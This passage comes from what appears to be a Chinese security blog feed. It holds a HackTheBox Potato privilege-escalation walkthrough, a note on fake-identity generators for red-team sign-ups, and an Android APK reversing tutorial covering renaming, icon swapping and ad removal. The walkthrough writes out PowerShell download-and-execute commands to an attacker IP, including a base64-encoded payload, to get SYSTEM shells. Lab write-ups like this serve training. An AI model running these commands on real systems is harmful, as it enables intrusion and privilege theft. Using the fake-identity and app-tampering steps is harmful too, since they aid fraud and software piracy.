net.webclient).downloadfile('http://10.10.14.40:5555/shell.bat', 'C:\Users\kohsuke\desktop\shell.bat')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后运行可执行文件</p><p>进行尝试获取模拟 SYSTEM 的令牌，然后以提升的权限运行我们的<code>shell.bat</code>文件</p><pre class="line-numbers language-none"><code class="language-none">./1.exe -t * -p shell.bat -l 3333<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111031811397.png" alt="image-20210822181920764"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111031811398.png" alt="image-20210822182132356"></p><h3 id="后续-2"><a href="#后续-2" class="headerlink" title="后续"></a>后续</h3><p>与Rotten Potato一样的情况</p><h2 id="Rogue-Potato"><a href="#Rogue-Potato" class="headerlink" title="Rogue Potato"></a>Rogue Potato</h2><h3 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h3><p>关于Rotten/Juicy土豆 的修复后，可以得出以下结论：</p><pre class="line-numbers language-none"><code class="language-none">1.我们无法在最新的 Windows 版本中为 OXID 解析器地址指定自定义端口2.如果我们将 OXID 解析请求重定向到我们控制下的端口 135 上的远程服务器,并将请求转发到我们的本地 Fake RPC 服务器,我们将仅获得一个匿名登录3.如果我们将 OXID 解析请求解析到一个假的 RPC 服务器，我们将在IRemUnkown2接口查询期间获得一个标识令牌<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111031811399.png" alt="image-20211022212202105"></p><pre class="line-numbers language-none"><code class="language-none">Rogue Potato通过指定远程 IP(攻击者 IP)指示 DCOM 服务器执行远程 OXID 查询在远程 IP 上，设置一个"socat"侦听器，用于将 OXID 解析请求重定向到一个假的OXID RPC 服务器伪造的OXID RPC 服务器实现了ResolveOxid2服务器过程，该过程将指向受控命名管道[ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]DCOM 服务器将连接到 RPC 服务器以执行IRemUnkown2接口调用。通过连接到命名管道，将执行"身份验证回调"，我们可以通过 RpcImpersonateClient()调用模拟调用者。然后,令牌窃取者  1.获取rpcss服务的PID  2.打开进程，列出所有句柄，并为每个句柄尝试复制它并获取句柄类型  3.如果句柄类型为"Token"且令牌所有者为 SYSTEM，则尝试使用CreatProcessAsUser()或CreateProcessWithToken()模拟并启动进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ul><li>我们需要有一台机器在我们的控制之下，我们可以在其中执行重定向，并且受害者必须可以在端口 135上访问该机器</li><li>我们需要上传两个 exe 文件，当受害者的防火墙不接受传入连接时，也可以在我们控制的 Windows 机器上以独立模式启动伪造的 OXID 解析器</li></ul><h3 id="原理概述-1"><a href="#原理概述-1" class="headerlink" title="原理概述"></a>原理概述</h3><pre class="line-numbers language-none"><code class="language-none">当我们运行RoguePotato.exe，我们可以让它在本地机器上启动该服务，或者我们可以在自己控制的 Windows 机器上启动它并让它到达那里如果我想在本地机器上使用解析器，我需要在我的机器上创建一个隧道，该隧道在 TCP 135 上接收并重定向回目标主机上的解析器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="实操-3"><a href="#实操-3" class="headerlink" title="实操"></a>实操</h3><p>Exp下载地址：<a href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p><p>使用的环境是：HackTheBox-Remote</p><p>开始</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111031811400.png" alt="image-20211102205146787"></p><p>powershell下载文件</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe (new-object net.webclient).downloadfile('http://10.10.14.6:8888/RoguePotato.exe', 'C:\tmp\RoguePotato.exe')powershell.exe (new-object net.webclient).downloadfile('http://10.10.14.6:8888/RogueOxidResolver.exe', 'C:\tmp\RogueOxidResolver.exe')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111031811401.png" alt="image-20211103170610456"></p><ul><li><code>-r 10.10.14.6</code> - 这是识别我的主机的必需选项；</li><li><code>-l 9999</code> - 本地监听的端口；</li><li><code>-e xxx</code> - 运行命令</li></ul><p>执行命令</p><pre class="line-numbers language-none"><code class="language-none">.\RoguePotato.exe -r 10.10.14.6 -c "{B91D5831-B1BD-4608-8198-D72E155020F7}" -e "powershell -c iex( iwr http://10.10.14.6:8888/shell.ps1 -UseBasicParsing )" -l 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>无法直接使用powershell命令直接执行上传shell提权<br>需要转换为base64值</p><pre class="line-numbers language-none"><code class="language-none">echo "IEX( IWR http://10.10.14.6:8888/shell1.ps1 -UseBasicParsing)" | iconv -t utf-16le|base64 -w 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2ADoAOAA4ADgAOAAvAHMAaABlAGwAbAAxAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">.\RoguePotato.exe -r 10.10.14.6 -e "cmd.exe /c powershell -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2ADoAOAA4ADgAOAAvAHMAaABlAGwAbAAxAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA=" -l 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>它提示我 </p><pre class="line-numbers language-none"><code class="language-none">[-] Named pipe didn't received any connect request<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111031811402.png" alt="image-20211103180317059"></p><p>它可能和CLSID有关系</p><p>进行查阅</p><p><a href="http://ohpe.it/juicy-potato/CLSID/">http://ohpe.it/juicy-potato/CLSID/</a></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111031811403.png" alt="image-20211103172348801"></p><pre class="line-numbers language-none"><code class="language-none">UsoSvc{E7299E79-75E5-47BB-A03D-6D319FB7F886}{B91D5831-B1BD-4608-8198-D72E155020F7}NT AUTHORITY\SYSTEM<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>继续</p><pre class="line-numbers language-none"><code class="language-none">.\RoguePotato.exe -r 10.10.14.6 -c "{B91D5831-B1BD-4608-8198-D72E155020F7}" -e "cmd.exe /c powershell -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2ADoAOAA4ADgAOAAvAHMAaABlAGwAbAAxAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA=" -l 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功提权到system</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ul><li>如果机器 &gt;= Windows 10 1809 &amp; Windows Server 2019 试试<a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato">Rogue Potato</a></li><li>如果机器 &lt; Windows 10 1809 &lt; Windows Server 2019 试试<a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#juicyPotato">Juicy Potato</a></li></ul><p>希望可以帮到各位师傅！</p>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Potato提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在线信息生成器</title>
      <link href="/2021/10/28/zai-xian-xin-xi-sheng-cheng-qi/"/>
      <url>/2021/10/28/zai-xian-xin-xi-sheng-cheng-qi/</url>
      
        <content type="html"><![CDATA[<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>在红队行中，需要注册很多账号，因此需要一些邮箱、身份信息、地址等等</p><p>在线信息生成器</p><pre class="line-numbers language-none"><code class="language-none">https://www.meiguodizhi.com/usa-address/hot-city-Los-Angeleshttps://www.fakeaddressgenerator.com/#all-countries<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>嘻嘻！ 那是非常好用</p>]]></content>
      
      
      <categories>
          
          <category> 红队技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 在线信息生成器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓学习(一)</title>
      <link href="/2021/10/28/an-zhuo-xue-xi-yi/"/>
      <url>/2021/10/28/an-zhuo-xue-xi-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="Android学习"><a href="#Android学习" class="headerlink" title="Android学习"></a>Android学习</h1><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>安卓5.0开始试用ART虚拟机，安卓系统也开始分32位和64位版本</p><h2 id="APK基本结构"><a href="#APK基本结构" class="headerlink" title="APK基本结构"></a>APK基本结构</h2><p>1、assets这里面一般放的是资源，这里面的资源通常是没有编译过的，像js、html等</p><p>2、lib目录放的一般是so文件，也就是本地代码</p><p>arm8、x64位的CPU…..APK很少有64位的，在动态调试的时候会有静态分析和动态分析arm代码是不一样的</p><p>armeabi：为了做兼容的：arm5的cpu</p><p>armeabi-v7a：是arm7的cpu</p><p>libs文件夹︰引用第三方的java包</p><p>3、META-INF: APK的签名</p><p>我们每次打包APK后都需要做一个签名，在系统里面是需要做验证的，不管是代码验证还是在安卓系统里面都需要签名验证</p><p>假设如果把APK文件改了，在放回去的话本身的签名和修改后放回去签名是不对应的，这时候怎么解决呢?</p><p>需要破解器破解系统核心，就算不重签名也可以放上去</p><p>或者安装在模拟器上面进行操作，模拟器支持不重签名也可以操作</p><p>4、res目录：放的资源，程序的图标、样式、布局、XML等，编译之后的文件，直接查看是乱码，需要反编译的</p><p>工具AndroidKiller即可反编译查看</p><p>5、AndroidManifest.xml：清单文件，直接查看大部分是乱码</p><p>清单：APK需要使用的一些权限、包名是什么、APK是否支持调试等等内</p><p>6、resources.arsc：编译之后的文件，语言包、程序内容等</p><p>7、classes.dex：dex文件，运行在Dalivk虚拟机上的文件，是smali代码也就是源代码，需要反编译转换为smali代码，还可以把smali代码转换为java代码或者直接des转换为jar包也可以</p><p>大型的apk里面会有好几个classes，分开放的原因，是因为文件大小是有限制的</p><h2 id="JVM、DVM、ART"><a href="#JVM、DVM、ART" class="headerlink" title="JVM、DVM、ART"></a>JVM、DVM、ART</h2><p>JVM：简单来说就是java虚拟机，运行的是<code>.java</code>文件编译后的<code>.class</code>文件</p><p>DVM: Dalvik虚拟机</p><p>在Android4.4及以前使用的都是Dalivk虚拟机，我们知道APK在打包的过程中会将java等源码通过<code>javac</code>编译成<code>.class</code>文件</p><p>但Dalvik虚拟机只会执行<code>.dex</code>文件，所以dx工具会将<code>.class</code>文件打包成<code>.dex</code>文件在丢给Dalvik虚拟机执行，但是Dalivk虚拟机在启动时候会将<code>.dex</code>文件转换成快速与进行的看机器码，又因为65535这个问题，导致我们在应用冷启动的时候有一个合包的过程，最后导致的一个结果就是APP启动慢，这就是Dalvik虚拟机的JIT特性。</p><p>这里要了解一下：如果超过65535就会重新生成<code>.dex</code>文件</p><p>ART:ART虚拟机</p><p>ART虚拟机是在Android5.0才开始试用的Android虚拟机，ART虚拟机必须要兼容Dalvik虚拟机的特性，但是ART有一个很好的特性AOT(ahead of time)，这个特性就是在安装APK的时候就将dex直接处理成可直接供ART虚拟机使用的机器码，ART虚拟机将<code>.dex</code>文件转换成可直接运行的<code>.oat</code>文件，ART虚拟机天生支持多dex，所以也不会有一个合包的过程，所以ART虚拟机会很大的提升APP冷启动速度。</p><h2 id="APK的打包流程"><a href="#APK的打包流程" class="headerlink" title="APK的打包流程"></a>APK的打包流程</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110233.png" alt="image-20210713101625323"></p><h1 id="Android开发工具"><a href="#Android开发工具" class="headerlink" title="Android开发工具"></a>Android开发工具</h1><h2 id="1-java环境安装"><a href="#1-java环境安装" class="headerlink" title="1.java环境安装"></a>1.java环境安装</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110251.png" alt="image-20210709173855560"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110303.png" alt="image-20210709174401894"></p><p>环境变量配置</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110332.png" alt="image-20210709174528517"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110337.png" alt="image-20210709174635240"></p><p>验证安装</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110340.png" alt="image-20210709174732277"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110350.png" alt="image-20210709174741848"></p><h2 id="2-adt-bundle"><a href="#2-adt-bundle" class="headerlink" title="2.adt-bundle"></a>2.adt-bundle</h2><p>这个是绿色版的 无需安装</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110713.png" alt="image-20210709175534286"></p><p>以命令形式调试安卓模拟器或者真机</p><p>ddms可以看模拟器进程的端口、log等输出的信息</p><h2 id="3-Eclipse"><a href="#3-Eclipse" class="headerlink" title="3.Eclipse"></a>3.Eclipse</h2><p>创建一个项目</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110720.png" alt="image-20210709175947942"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110725.png" alt="image-20210709180131378"></p><p>创建完成</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110754.png" alt="image-20210709180150260"></p><p>然后这里要做几个 配置</p><p>配置java编译环境</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110759.png" alt="image-20210709180224007"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110802.png" alt="image-20210709180255773"></p><p>配置java运行环境</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110804.png" alt="image-20210709180425202"></p><p>要添加新java环境的 如下操作</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110807.png" alt="image-20210709180450117"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110814.png" alt="image-20210709180502118"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110818.png" alt="image-20210709180517553"></p><p>配置当前文件的编码</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110821.png" alt="image-20210709180609777"></p><p>要支持 中文的 选择UTF-8</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713110940.png" alt="image-20210709180654375"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111026.png" alt="image-20210709180743760"></p><p>配置Java代码提示</p><pre class="line-numbers language-none"><code class="language-none">abcdefghijklmnopqrstuvwxyz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111032.png" alt="image-20210709181128325"></p><p>创建一个class文件</p><p>勾选之后 会自动生成主函数</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111035.png" alt="image-20210709181235738"></p><p>进行简单的输出</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111039.png" alt="image-20210709181340714"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111042.png" alt="image-20210709181357526"></p><h1 id="Android逆向工具配置"><a href="#Android逆向工具配置" class="headerlink" title="Android逆向工具配置"></a>Android逆向工具配置</h1><h2 id="1-AndroidKiller"><a href="#1-AndroidKiller" class="headerlink" title="1.AndroidKiller"></a>1.AndroidKiller</h2><p>这个工具的搜索功能 非常的强大！！！<br>集Apk反编译、Apk打包、Apk签名，编码互转，<br>ADB通信（应用安装-卸载-运行-设备文件管理)等特色功能于一身，支持logcat日志输出，语法高亮，<br>基于关键字（支持单行代码或多行代码段)项目内搜索，可自定义外部工具;吸收融汇多种工具功能与特点，打造一站式逆向工具操作体验，大大简化了用户在安卓应用/游戏修改过程中的各类繁琐工作。</p><p>SDK安装</p><p>命令行模式 调试APK文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111045.png" alt="image-20210709230135492"></p><p>解压之后 目录下有这两个文件 </p><p>然后进行环境变量的配置</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111048.png" alt="image-20210709230348549"></p><p>验证安装</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111100.png" alt="image-20210709230428550"></p><p>安装NDK</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111103.png" alt="image-20210709231209583"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111106.png" alt="image-20210709231246697"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111109.png" alt="image-20210709231443719"></p><p>进行安装AndroidKiller</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111111.png" alt="image-20210709231807097"></p><p>进行关联Java包</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111114.png" alt="image-20210709232033216"></p><p>APKtool加载</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111116.png" alt="image-20210709232918202"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111120.png" alt="image-20210709232936932"></p><p>配置完毕 丢个apk进去</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111123.png" alt="image-20210709233557726"></p><p>然后呢 进行对比一下 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111127.png" alt="image-20210709233701153"></p><pre class="line-numbers language-none"><code class="language-none">classes.dex--反编译成--&gt;smaliclasses2.dex--反编译成--&gt;smali_classes2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>AndroidManifest.xml</code>是APK的配置文件 同时也是可以打开的</p><p>有三大功能：</p><pre class="line-numbers language-none"><code class="language-none">1.工程信息2.工程管理器3.工程搜索<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后 工程搜索功能</p><p>这个 功能很强大</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111130.png" alt="image-20210709234523205"></p><p>当我们进行搜索的时候 它是一条一条的列举出来 很方便 点击 即可跳转</p><p>历史记录管理 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111137.png" alt="image-20210709234614367"></p><p>文本转换</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111134.png" alt="image-20210709234628992"></p><p>字符编码</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111152.png" alt="image-20210709234643601"></p><p>进行分析xml配置文件</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.tudou.android" platformBuildVersionCode="25" platformBuildVersionName="7.1.1"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前面是 版本 编码 和官网</p><p><strong>重点是package是标签名</strong></p><p>修改之后 要和<code>&lt;provider</code>进行对应</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111141.png" alt="image-20210710002118501"></p><p>继续</p><p><code>&lt;uses-permission</code>是权限的意思 访问的网络 存储等</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111201.png" alt="image-20210710001429775"></p><p>这个 icon是图标的意思</p><p><code>android:icon="@drawable/icon"</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111205.png" alt="image-20210710001911350"></p><p><code>android:label="@string/tudou_app_name"</code></p><p>这个是APP的名字</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111212.png" alt="image-20210710002351847"></p><p>然后进行模拟器的安装</p><p>这边推荐逍遥模拟器和雷电模拟器 </p><p>而且 要注意在本机安装 模拟器是吃CPU的 </p><p>安装在虚拟机 卡的不要不要的。。。</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111229.png" alt="image-20210710002714967"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111240.png" alt="image-20210710003750664"></p><h3 id="实操一、-改APP名"><a href="#实操一、-改APP名" class="headerlink" title="实操一、(改APP名)"></a>实操一、(改APP名)</h3><p>拿<code>火柴人突击格斗.apk</code>进行举例</p><p>还是一样 直接丢进来</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111247.png" alt="image-20210710232848356"></p><p>然后<code>@string</code>是索引 我继续搜索<code>app_name</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111548.png" alt="image-20210710233009500"></p><p>最后发现APP的名字 都是指向了这个<code>strings.xml</code>文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111551.png" alt="image-20210710233059584"></p><p>进行修改 即可 修改之后 记得保存！</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111556.png" alt="image-20210710233153503"></p><p>然后进行编译 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111600.png" alt="image-20210710234227689"></p><p>丢到模拟器中进行查看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111602.png" alt="image-20210710234252021"></p><p>可以看到是成功的</p><h3 id="实操二、-改APP图标"><a href="#实操二、-改APP图标" class="headerlink" title="实操二、(改APP图标)"></a>实操二、(改APP图标)</h3><p>然后下面进行修改图标 搞一个土豆视频</p><p>我随意截了一张图</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111609.png" alt="image-20210710232449360"></p><p>是jpg的图像 这里 要去进行转换 </p><p><strong>千万不要自己直接改后缀，因为两者像素是不一样</strong></p><p>可以去这里：<a href="https://app.xunjiepdf.com/img2png/">https://app.xunjiepdf.com/img2png/</a></p><p>然后进行搜索</p><pre class="line-numbers language-none"><code class="language-none">@drawable/icon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111611.png" alt="image-20210710234914240"></p><p>要找的不是这个</p><p>继续搜索<code>icon</code></p><p>这里有太多的文件 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111615.png" alt="image-20210710235219352"></p><p>继续添加后缀进行搜索</p><pre class="line-numbers language-none"><code class="language-none">/icon.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111618.png" alt="image-20210711000639474"></p><p>总共是6个</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111621.png" alt="image-20210710235002808"></p><p>进行替换</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111624.png" alt="image-20210710235142467"></p><p>其他几个也是一样</p><p>进行编译</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111627.png" alt="image-20210711001118963"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111629.png" alt="image-20210711001302095"></p><p>编译失败了 我感觉是图片的问题</p><p>重新搞一张</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111633.png" alt="palm_tree_PNG93355"></p><p>这次成功了 还是建议找一张原本是<code>png</code>的图片</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111639.png" alt="image-20210711001921411"></p><p>进行安装查看图标</p><p>成功 替换图标</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111642.png" alt="image-20210711002142356"></p><h3 id="实操三、-去广告"><a href="#实操三、-去广告" class="headerlink" title="实操三、(去广告)"></a>实操三、(去广告)</h3><p>以火柴人APK为例</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111646.png" alt="image-20210713085553760"></p><p>启动时候 发现了广告</p><p>直接丢进来</p><p>这个APP是很老的游戏了 但是广告还是最新的 </p><p>因为网络的原因</p><p>开始分析静态文件中的权限部分</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111649.png" alt="image-20210713090256123"></p><p>把<code>NETWORK_STATE</code>和<code>WIFI_STATE</code>这两部分先删除</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111653.png" alt="image-20210713092601482"></p><p>那么 这个APP就获取不到网络  是不是就没有广告了？</p><p>其实不然 它变成了一个空页面  只是没有了内容</p><p>这里要了解一下：<code>activity</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111657.png" alt="image-20210713090721509"></p><p>只要<code>MAIN</code>和<code>LAUNCHER</code>结合在一起 并在一个activity内 那么就是最先跳出来的页面</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111903.png" alt="image-20210713091925355"></p><p>那么我们可以把它删除 然后把下面那个页面 改为<code>MAIN</code>和<code>LAUNCHER</code>的组合 作为第一个跳转</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111908.png" alt="image-20210713092040627"></p><p>记得保存</p><p>然后进行编译输出</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111911.png" alt="image-20210713092714380"></p><p>安装尝试</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111923.png" alt="image-20210713092812984"></p><p>可以看到直接就进来了</p><h2 id="2-Android官网逆向助手少月版V2018"><a href="#2-Android官网逆向助手少月版V2018" class="headerlink" title="2.Android官网逆向助手少月版V2018"></a>2.Android官网逆向助手少月版V2018</h2><p>需要Java的环境</p><p>主要用的是这三个功能</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713111939.png" alt="image-20210709181939855"></p><h2 id="3-jadx"><a href="#3-jadx" class="headerlink" title="3.jadx"></a>3.jadx</h2><p>这是一个反编译的工具</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713112040.png" alt="image-20210709182252966"></p><pre class="line-numbers language-none"><code class="language-none">jadx -d out classes.dex<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就可以将dex文件反编译成java文件</p><h2 id="4-JEB"><a href="#4-JEB" class="headerlink" title="4.JEB"></a>4.JEB</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113108.png" alt="image-20210709182629452"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113109.png" alt="image-20210709182838775"></p><p>丢进去一个APK</p><p>按键Q可以进行：Smali代码和Java代码的转换</p><p>CTRL+B：进行断点(Smali代码下才可以)</p><h1 id="Android调试工具"><a href="#Android调试工具" class="headerlink" title="Android调试工具"></a>Android调试工具</h1><h2 id="1-JEB"><a href="#1-JEB" class="headerlink" title="1.JEB"></a>1.JEB</h2><p>这里就不再阐述了</p><h2 id="2-IDEA"><a href="#2-IDEA" class="headerlink" title="2.IDEA"></a>2.IDEA</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113110.png" alt="image-20210709184725997"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113111.png" alt="image-20210709184813557"></p><p>然后 一路默认过去</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113112.png" alt="image-20210709185155774"></p><h2 id="3-IDA-Pro"><a href="#3-IDA-Pro" class="headerlink" title="3.IDA_Pro"></a>3.IDA_Pro</h2><p>因为是破解版 所以关闭杀软</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113113.png" alt="image-20210709194138835"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113114.png" alt="image-20210709194229657"></p><p>安装完成</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113115.png" alt="image-20210709194425288"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113116.png" alt="image-20210709194506520"></p><h1 id="Android辅助工具"><a href="#Android辅助工具" class="headerlink" title="Android辅助工具"></a>Android辅助工具</h1><h2 id="1-APK-helper"><a href="#1-APK-helper" class="headerlink" title="1.APK helper"></a>1.APK helper</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113117.png" alt="image-20210709194716307"></p><p>丢一个APK进来 可以快速的看到包名</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113118.png" alt="image-20210709194839030"></p><h2 id="2-PKiD"><a href="#2-PKiD" class="headerlink" title="2.PKiD"></a>2.PKiD</h2><p>可以快速的查壳</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113119.png" alt="image-20210709194924343"></p><h1 id="Android流量抓包"><a href="#Android流量抓包" class="headerlink" title="Android流量抓包"></a>Android流量抓包</h1><h2 id="Fiddler"><a href="#Fiddler" class="headerlink" title="Fiddler"></a>Fiddler</h2><p><img 